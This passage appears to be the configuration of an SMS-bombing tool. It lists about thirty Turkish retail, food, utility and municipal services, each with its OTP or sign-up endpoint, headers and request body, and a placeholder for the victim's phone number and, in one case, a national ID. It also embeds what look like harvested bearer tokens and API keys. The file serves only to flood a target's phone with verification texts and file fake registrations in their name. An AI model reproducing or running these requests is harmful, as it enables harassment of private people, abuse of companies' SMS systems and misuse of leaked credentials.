DATA device_id=2390ED28-075E-465A-96DA-DFE8F84EB330
DATA full_name=Memati Bas
DATA gsm={phone}
DATA is_advertisement=1
DATA is_contract=1
DATA password=31MeMaTi31
END

SERVICE kimgb:KimGb:90
URL https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"msisdn": "90{phone}"}
END

SERVICE evidea:Evidea:90
URL https://www.evidea.com/users/register/
METHOD POST
CONTENT_TYPE form
DATA first_name=Memati
DATA last_name=Bas
DATA email=test@gmail.com
DATA email_allowed=false
DATA sms_allowed=true
DATA password=31ABC..abc31
DATA phone=0{phone}
DATA confirm=true
END

SERVICE ucdortbes:Ucdortbes:90
URL https://api.345dijital.com/api/users/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"email": "", "name": "Memati", "phoneNumber": "+90{phone}", "surname": "Bas"}
END

SERVICE macro:Macro:90
URL https://www.macrocenter.com.tr/rest/users/register/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"email": "test@gmail.com", "phoneNumber": "{phone}"}
END

SERVICE tiklagelsin:TiklaGelsin:90
URL https://svc.apps.tiklagelsin.com/user/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"operationName": "GENERATE_OTP", "variables": {"phone": "+90{phone}", "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB"}}
END

SERVICE ayyildiz:Ayyildiz:90
URL https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister
METHOD POST
CONTENT_TYPE form
DATA gsm={phone}
HEADER Token: MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS
END

SERVICE naosstars:Naosstars:90
URL https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"telephone": "+90{phone}", "type": "register"}
END

SERVICE istegelsin:Istegelsin:90
URL https://prod.fasapi.net/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"operationName": "SendOtp2", "variables": {"phoneNumber": "90{phone}"}}
END

SERVICE koton:Koton:90
URL https://www.koton.com/users/register/
METHOD POST
CONTENT_TYPE form
DATA first_name=Memati
DATA last_name=Bas
DATA email=test@gmail.com
DATA password=31ABC..abc31
DATA phone=0{phone}
DATA confirm=true
DATA sms_allowed=true
DATA email_allowed=true
DATA date_of_birth=1993-07-02
END

SERVICE hayatsu:Hayatsu:90
URL https://api.hayatsu.com.tr/api/SignUp/SendOtp
METHOD POST
CONTENT_TYPE form
DATA mobilePhoneNumber={phone}
DATA actionType=register
END

SERVICE hizliecza:Hizliecza:90
URL https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"otpOperationType": 2, "phoneNumber": "+90{phone}"}
END

SERVICE ipragaz:Ipragaz:90
URL https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobilePhoneNumber": "+90{phone}"}
END

SERVICE hey:Hey:90
URL https://heyapi.heymobility.tech/V14//api/User/ActivationCodeRequest
METHOD POST
CONTENT_TYPE form
DATA phonenumber={phone}
HEADER organizationId: 9DCA312E-18C8-4DAE-AE65-01FEAD558739
END

SERVICE bisu:Bisu:90
URL https://www.bisu.com.tr/api/v2/app/authentication/phone/register
METHOD POST
CONTENT_TYPE form
DATA phoneNumber={phone}
HEADER X-Device-Platform: IOS
END

SERVICE tavukdunyasi:TavukDunyasi:90
URL https://onlinesiparis-api.tavukdunyasi.com/api/InternalAuth/InternalRegister
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"email": "test@gmail.com", "password": "Test1234!", "name": "Test", "surname": "User", "countryCode": "90", "phoneNumber": "{phone}", "birthDate": "1990-01-01", "gender": 1}
END

SERVICE sendpulse:SendPulse:90
URL https://login.sendpulse.com/api/v1/verification/phone
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}", "purpose": "signup"}
END

SERVICE komagene:Komagene:90
URL https://gateway.komagene.com.tr/auth/auth/smskodugonder
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"FirmaId": 32, "Telefon": "{phone}"}
END

SERVICE porty:Porty:90
URL https://panel.porty.tech/api.php
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"job": "start_login", "phone": "{phone}"}
END

SERVICE tasdelen:Tasdelen:90
URL https://tasdelen.sufirmam.com/mobile/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE beefull:Beefull:90
URL https://app.beefull.io/api/inavitas-access-management/sms-login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phoneCode": "90", "phoneNumber": "{phone}", "tenant": "beefull"}
END

SERVICE dominos:Dominos:90
URL https://frontend.dominos.com.tr/api/customer/sendOtpCode
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Authorization: Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4MofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg
BODY {"email": "test@gmail.com", "isSure": false, "mobilePhone": "{phone}"}
END

SERVICE pidem:Pidem:90
URL https://restashop.azurewebsites.net/graphql/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"query": "mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }", "variables": {"phone": "{phone}"}}
END

SERVICE frink:Frink:90
URL https://api.frink.com.tr/api/auth/postSendOTP
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"areaCode": "90", "etkContract": true, "language": "TR", "phoneNumber": "90{phone}"}
END

SERVICE bodrum:Bodrum:90
URL https://gandalf.orwi.app/api/user/requestOtp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Apikey: Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE
BODY {"gsm": "+90{phone}", "source": "orwi"}
END

SERVICE kofteciyusuf:KofteciYusuf:90
URL https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"FireBaseCihazKey": null, "FirmaId": 82, "GuvenlikKodu": null, "Telefon": "{phone}"}
END

SERVICE coffy:Coffy:90
URL https://user-api-gw.coffy.com.tr/user/signup
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"countryCode": "90", "gsm": "{phone}", "isKVKKAgreementApproved": true, "isUserAgreementApproved": true, "name": "Test User"}
END

SERVICE sancaktepe:Sancaktepe:90
URL https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet
METHOD POST
CONTENT_TYPE form
DATA SahisUyelik.TCKimlikNo={tc}
DATA SahisUyelik.DogumTarihi=13.01.2000
DATA SahisUyelik.Ad=TEST
DATA SahisUyelik.Soyad=USER
DATA SahisUyelik.CepTelefonu={phone}
DATA SahisUyelik.EPosta=test@test.com
DATA SahisUyelik.Sifre=Test1234
DATA SahisUyelik.SifreyiDogrula=Test1234
END

SERVICE alixavien:Alixavien:90
URL https://www.alixavien.com.tr/api/member/sendOtp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"Phone": "+90{phone}", "XID": ""}
END

SERVICE jimmykey:JimmyKey:90
URL https://www.jimmykey.com/tr/p/User/SendConfirmationSms
METHOD GET
CONTENT_TYPE params
PARAM gsm={phone}
END

